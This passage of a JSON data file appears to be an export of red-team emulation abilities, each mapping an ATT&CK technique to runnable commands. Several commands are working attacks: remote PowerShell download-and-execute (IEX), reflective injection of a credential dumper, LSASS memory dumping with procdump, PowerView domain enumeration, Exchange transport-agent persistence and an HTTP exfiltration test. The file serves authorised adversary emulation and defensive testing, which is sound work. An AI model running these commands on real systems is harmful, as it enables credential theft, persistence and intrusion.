                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.bookmarks",
                        "parserconfigs": [
                            {
                                "edge": "resolves_to",
                                "target": "host.chrome.bookmark_url",
                                "source": "host.chrome.bookmark_title",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get Chrome Bookmarks",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Get Chrome Bookmarks",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "fa6e8607-e0b1-425d-8924-9b894da5a002",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Time Discovery",
        "technique_id": "T1124",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.current.time",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.current.time",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.current.time",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "get current system time (ISO 8601)",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Get System Time",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.json",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {
                                    "json_key": "samaccountname",
                                    "json_type": "str"
                                }
                            }
                        ]
                    }
                ],
                "payloads": [
                    "powerview.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get Administrator users for a computer",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "GetAdminMembers",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "powerview.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get a list of all computers in a domain",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "GetComputers (Alice)",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "221d4ebcb41e708b6ee90c1c0369a969",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Path .\\CurrentUserObject.txt -Force"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "GetCurrent User with PowerShell Script",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "6131397e-7765-424e-a594-3d7fb2d93a6a",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "technique_id": "T1482",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.json",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.ad.forest",
                                "custom_parser_vals": {
                                    "json_key": "Forest",
                                    "json_type": "str"
                                }
                            },
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.ad.name",
                                "custom_parser_vals": {
                                    "json_key": "Name",
                                    "json_type": "str"
                                }
                            }
                        ]
                    }
                ],
                "payloads": [
                    "powerview.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Determine the Windows Domain of a computer",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "GetDomain",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.json",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {
                                    "json_key": "samaccountname",
                                    "json_type": "str"
                                }
                            }
                        ]
                    }
                ],
                "payloads": [
                    "powerview.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Get Service Accounts for a domain",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "GetServiceAccounts",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "98adc43648b0e4ea6e90a88ad5ae4b3d",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "Stop-Process -name mshta"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1204.002\\src\\chromeexec-macrocode.txt\" -officeProduct \"Word\" -sub \"ExecChrome\"",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Headless Chrome code execution via VBA",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b7dec45aa350b4ec6f1c41336e1f7a14",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Automated Exfiltration",
        "technique_id": "T1020",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; Remove-Item -Path $fileName -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"; $url = \"https://google.com\"; $file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"; $contentType = \"application/octet-stream\"; try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "IcedID Botnet HTTP PUT",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "technique_id": "T1518.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify Firewalls",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Identify Firewalls",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c0da588f-79f0-4263-8998-7496b1a40596",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "technique_id": "T1033",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "whoami",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {}
                            },
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "whoami",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {}
                            },
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$env:username",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {}
                            },
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo %username%",
                "name": "cmd",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {}
                            },
                            {
                                "edge": "",
                                "target": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find user running agent",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Identify active user",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "feaced8f-f43f-452a-9500-a5219488abb8",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "technique_id": "T1087.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "dscl . list /Users | grep -v '_'",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-WmiObject -Class Win32_UserAccount",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Identify all local users",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Identify local users",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3796a00b-b11d-4731-b4ca-275a07d83299",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "technique_id": "T1059.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$job = Start-Job -ScriptBlock {\n  $username = '#{host.user.name}';\n  $password = '#{host.user.password}';\n  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;\n  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;\n  Start-Process Notepad.exe -NoNewWindow -PassThru -Credential $credential;\n};\nReceive-Job -Job $job -Wait;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Run an application as a different user",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Impersonate user",
        "tactic": "execution",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.basic",
                "relationship_match": [
                    {
                        "source": "host.user.name",
                        "edge": "has_password",
                        "target": "host.user.password"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "Process Injection: Portable Executable Injection",
        "technique_id": "T1055.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"file\",\"debugger.dll\");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Injects cred dumper exe into an available process",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Inject Cred dumper into process (Spookier)",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "a398986f-31b0-436a-87e9-c8e82c028f3c",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Process Injection: Portable Executable Injection",
        "technique_id": "T1055.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"shared.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add(\"file\",\"Invoke-ReflectivePEInjection.ps1\");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Injects sandcat DLL into an available process",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Inject Sandcat into process",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.process.id"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "9425d3aacf44bced9a9d1ec9dc3a70f9",
        "buckets": [
            "persistence"
        ],
        "privilege": "",
        "technique_name": "Server Software Component: Transport Agent",
        "technique_id": "T1505.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){;   Disable-TransportAgent Security Interop Agent;   Uninstall-TransportAgent Security Interop Agent;   Get-TransportAgent; }"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll; Enable-TransportAgent Security Interop Agent; Get-TransportAgent | Format-List Name,Enabled",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Install MS Exchange Transport Agent Persistence",
        "tactic": "persistence",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "eb814e03-811a-467a-bc6d-dcd453750fa2",
        "buckets": [
            "command-and-control"
        ],
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "technique_id": "T1105",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Download and install PSTools by unzipping the file",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Install PSTools",
        "tactic": "command-and-control",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "60f63260-39bb-4136-87a0-b6c2dca799fc",
        "buckets": [
            "command-and-control"
        ],
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "technique_id": "T1105",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm PowerShellCore.msi;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$wc=New-Object System.Net.WebClient;\n$output=\"PowerShellCore.msi\";\n$wc.DownloadFile(\"https://github.com/PowerShell/PowerShell/releases/download/v6.2.2/PowerShell-6.2.2-win-x64.msi\", $output);\nStart-Process msiexec.exe -ArgumentList \"/package PowerShellCore.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1\" -Wait;\n$env:Path += \";C:\\Program Files\\Powershell\\6\";\nStart-Process pwsh -ArgumentList \"-c #{location} -server #{server} - group #{group}\" -WindowStyle hidden;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Download, install and start new process under PowerShell Core 6",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Install PowerShell Core 6",
        "tactic": "command-and-control",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Software Discovery",
        "technique_id": "T1518",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Determine the version of Internet Explorer running",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Internet Explorer Version",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "68235976-2404-42a8-9105-68230cfef562",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Defacement",
        "technique_id": "T1491",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\Invoke-MemeKatz.ps1",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "Invoke-MemeKatz.ps1"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": ".\\Invoke-MemeKatz.ps1",
                "name": "pwsh",
                "parsers": [],
                "payloads": [
                    "Invoke-MemeKatz.ps1"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"",
                "name": "cmd",
                "parsers": [],
                "payloads": [
                    "Invoke-MemeKatz.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Downloads random meme and sets as desktop background",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Invoke-MemeKatz",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "f71199dcf1e307fc37c5a0cb9e4031b9",
        "buckets": [
            "execution"
        ],
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "technique_id": "T1204.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$file1 = \"$env:Temp\\test10.lnk\"; $file2 = \"$env:Temp\\a.exe\"; Remove-Item $file1 -ErrorAction Ignore; Remove-Item $file2 -ErrorAction Ignore"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"; $file1 = \"$env:Temp\\test10.lnk\"; Start-Process $file1; Start-Sleep -s 10; taskkill /IM a.exe /F",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "LNK Payload Download",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9",
        "buckets": [
            "impact"
        ],
        "privilege": "",
        "technique_name": "Defacement",
        "technique_id": "T1491",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo 'proof that this machine was hacked.' > message.txt",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo 'proof that this machine was hacked.' > message.txt",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.'",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Create a text file for the user to find",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Leave note",
        "tactic": "impact",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "technique_id": "T1003.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Dump lsass for later use with mimikatz",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
